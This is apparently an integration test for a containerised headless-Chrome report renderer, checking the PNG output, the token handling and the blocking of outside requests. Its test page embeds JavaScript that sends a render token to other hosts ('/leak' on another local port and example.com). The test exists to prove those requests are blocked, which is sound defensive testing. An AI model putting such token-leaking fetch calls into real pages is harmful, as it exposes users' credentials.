//go:build integration

package chrome_test

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"image/png"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/onuragtas/openlog/internal/renderer"
)

// TestRendererContainer runs the openlog-renderer image against a small test page served from the host and checks
// the PNG captures: OPENLOG_TEST_RENDERER_IMAGE=openlog-renderer:dev go test -tags integration ./internal/renderer/chrome/
// (Docker Desktop: the container reaches the host as host.docker.internal).
func TestRendererContainer(t *testing.T) {
	image := os.Getenv("OPENLOG_TEST_RENDERER_IMAGE")
	if image == "" {
		t.Skip("OPENLOG_TEST_RENDERER_IMAGE is not set")
	}
	hostName := os.Getenv("OPENLOG_TEST_RENDERER_HOST")
	if hostName == "" {
		hostName = "host.docker.internal"
	}

	var externalHits atomic.Int64
	outside := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		externalHits.Add(1)
		w.WriteHeader(http.StatusNoContent)
	}), ReadHeaderTimeout: 5 * time.Second}
	outsideLn, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() { _ = outside.Serve(outsideLn) }()
	defer outside.Close()
	outsidePort := outsideLn.Addr().(*net.TCPAddr).Port

	var sawToken atomic.Bool
	page := fmt.Sprintf(`<!doctype html><html><head><style>
body { margin: 0; font-family: sans-serif; background: #fff; }
.w { box-sizing: border-box; width: 300px; background: #2563eb; color: #fff; margin: 0 0 16px; }
</style></head><body>
<div class="w" data-render-id="w1" style="height:120px">one</div>
<div class="w" data-render-id="w2" style="height:250px;width:400px;background:#16a34a">two</div>
<div class="w" data-render-id="w3" data-render-error="1" style="height:50px">failed</div>
<script>
  const token = new URLSearchParams(location.hash.slice(1)).get("token") || "";
  // Requests outside the UI origin must be blocked by the renderer.
  fetch("http://127.0.0.1:%d/leak?x=" + encodeURIComponent(token)).catch(() => {});
  fetch("http://%s:%d/leak2").catch(() => {});
  fetch("/token?t=" + encodeURIComponent(token)).then(() => {
    setTimeout(() => { document.documentElement.dataset.renderState = "ready"; }, 100);
  });
</script></body></html>`, outsidePort, "example.com", outsidePort)
	mux := http.NewServeMux()
	mux.HandleFunc("GET /print/test", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write([]byte(page))
	})
	mux.HandleFunc("GET /token", func(w http.ResponseWriter, r *http.Request) {
		sawToken.Store(strings.HasPrefix(r.URL.Query().Get("t"), renderer.TokenPrefix))
		w.WriteHeader(http.StatusNoContent)
	})
	ln, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		t.Fatal(err)
	}
	ui := &http.Server{Handler: mux, ReadHeaderTimeout: 5 * time.Second}
	go func() { _ = ui.Serve(ln) }()
	defer ui.Close()
	origin := fmt.Sprintf("http://%s:%d", hostName, ln.Addr().(*net.TCPAddr).Port)

	b := make([]byte, 24)
	_, _ = rand.Read(b)
	secret := hex.EncodeToString(b)
	name := "openlog-f-render-it-" + hex.EncodeToString(b[:4])
	args := []string{"run", "-d", "--rm", "--name", name, "-p", "127.0.0.1::8090",
		"--read-only", "--tmpfs", "/tmp:size=512m,mode=1777", "--shm-size", "256m", "--cap-drop", "ALL",
		"--security-opt", "no-new-privileges:true", "--memory", "1536m", "--pids-limit", "512",
		"--add-host", "host.docker.internal:host-gateway",
		"-e", "OPENLOG_RENDERER_TOKEN=" + secret, "-e", "OPENLOG_RENDERER_UI_ORIGIN=" + origin,
		"-e", "OPENLOG_RENDERER_CHROMIUM_NO_SANDBOX=" + envOr("OPENLOG_TEST_RENDERER_NO_SANDBOX", "true"),
		image}
	if out, err := exec.Command("docker", args...).CombinedOutput(); err != nil {
		t.Fatalf("docker run: %v: %s", err, out)
	}
	defer func() {
		if t.Failed() {
			logs, _ := exec.Command("docker", "logs", name).CombinedOutput()
			t.Logf("renderer logs:\n%s", logs)
		}
		_ = exec.Command("docker", "rm", "-f", name).Run()
	}()
	out, err := exec.Command("docker", "port", name, "8090/tcp").Output()
	if err != nil {
		t.Fatal(err)
	}
	addr := strings.TrimSpace(strings.Split(string(out), "\n")[0])
	client, err := renderer.NewClient("http://"+addr, secret, nil, 90*time.Second)
	if err != nil {
		t.Fatal(err)
	}

	tok, err := renderer.NewReportToken(renderer.KeyFromSecret("integration-secret-integration-secret"), renderer.Claims{OrgID: "o", TenantID: "t",
		DashboardID: "d", ReportID: "r", From: 1, To: 2}, time.Now(), time.Minute)
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	var res *renderer.Response
	for deadline := time.Now().Add(30 * time.Second); ; {
		res, err = client.Render(ctx, renderer.Request{Path: "/print/test", Token: tok, Width: 800, Scale: 2})
		if err == nil || time.Now().After(deadline) || !strings.Contains(err.Error(), "connect") && !strings.Contains(err.Error(), "EOF") && !strings.Contains(err.Error(), "reset") {
			break
		}
		time.Sleep(time.Second)
	}
	if err != nil {
		t.Fatal(err)
	}
	if !sawToken.Load() {
		t.Error("the page did not receive the render token from the fragment")
	}
	if n := externalHits.Load(); n != 0 {
		t.Errorf("%d requests outside the UI origin reached the network", n)
	}
	want := map[string][2]int{"w1": {600, 240}, "w2": {800, 500}}
	if len(res.Images) != 2 {
		t.Fatalf("images %d, errors %+v", len(res.Images), res.Errors)
	}
	for _, img := range res.Images {
		cfg, err := png.DecodeConfig(bytes.NewReader(img.PNG))
		if err != nil {
			t.Fatalf("%s: invalid PNG: %v", img.ID, err)
		}
		w := want[img.ID]
		if cfg.Width != w[0] || cfg.Height != w[1] || img.Width != w[0] || img.Height != w[1] {
			t.Errorf("%s: PNG %dx%d (reported %dx%d), want %dx%d", img.ID, cfg.Width, cfg.Height, img.Width, img.Height, w[0], w[1])
		}
	}
	if len(res.Errors) != 1 || res.Errors[0].ID != "w3" {
		t.Errorf("errors %+v", res.Errors)
	}

	// Pages outside /print/ are refused before the browser starts.
	if _, err := client.Render(ctx, renderer.Request{Path: "/settings", Token: tok}); err == nil {
		t.Error("non-print path accepted")
	}
}

func envOr(name, def string) string {
	if v := os.Getenv(name); v != "" {
		return v
	}
	return def
}
